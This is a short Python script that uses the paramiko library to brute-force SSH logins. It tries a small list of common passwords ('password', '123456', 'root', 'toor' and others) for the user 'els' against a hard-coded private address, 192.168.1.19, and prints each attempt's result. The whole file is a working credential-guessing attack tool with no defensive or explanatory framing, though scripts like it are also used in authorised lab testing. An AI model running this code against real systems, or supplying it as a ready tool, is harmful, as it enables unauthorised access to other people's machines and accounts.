import paramiko
import time

def ssh_bruteforce(ip, port, username, password_list):
    """
    Attempt to brute-force SSH login credentials.

    :param ip: The target IP address.
    :type ip: str
    :param port: The target port (usually 22 for SSH).
    :type port: int
    :param username: The SSH username to attempt.
    :type username: str
    :param password_list: A list of passwords to try.
    :type password_list: list of str
    :return: True if the correct password is found, False otherwise.
    :rtype: bool
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            client.connect(ip, port, username, password, timeout=3)
            print(f'Success! Username: {username}, Password: {password}')
            client.close()
            return True
        except paramiko.AuthenticationException:
            print(f'Failed: {password}')
            time.sleep(1)  # Wait 1 second between attempts
        except Exception as e:
            print(f'Error: {e}')
            time.sleep(1)

    return False

if __name__ == '__main__':
    target_ip = '192.168.1.19'  # Target IP address
    target_port = 22  # SSH port
    target_username = 'els'  # SSH username

    # List of passwords to try
    password_list = [
        'password',
        '123456',
        'admin',
        'root',
        'toor',
        'letmein'
    ]

    success = ssh_bruteforce(target_ip, target_port, target_username, password_list)
    if not success:
        print('Bruteforce attack failed.')
